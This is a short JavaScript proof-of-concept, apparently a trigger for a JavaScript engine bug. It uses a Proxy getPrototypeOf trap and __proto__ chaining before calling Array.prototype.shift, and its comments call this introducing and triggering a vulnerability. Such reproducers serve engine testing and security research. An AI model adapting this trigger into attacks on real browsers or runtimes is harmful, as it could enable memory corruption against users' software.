var a = new Array(0x11111111, 0x22222222, 0x33333333, 0x44444444, 0x12121212, 0x23232323, 0x12345670, 0x7777);

var handler = {
    getPrototypeOf: function(target, name){
        return a;
    }
};

var p = new Proxy([], handler);
var b = [{}, [], "natalie"];

b.__proto__ = p;
b.length = 4;

// Introduce a vulnerability by manipulating the prototype chain
var c = [{}, [], "test"]; // Create another object
c.__proto__ = b; // Manipulate the prototype chain

// Trigger the vulnerability
a.shift.call(c);
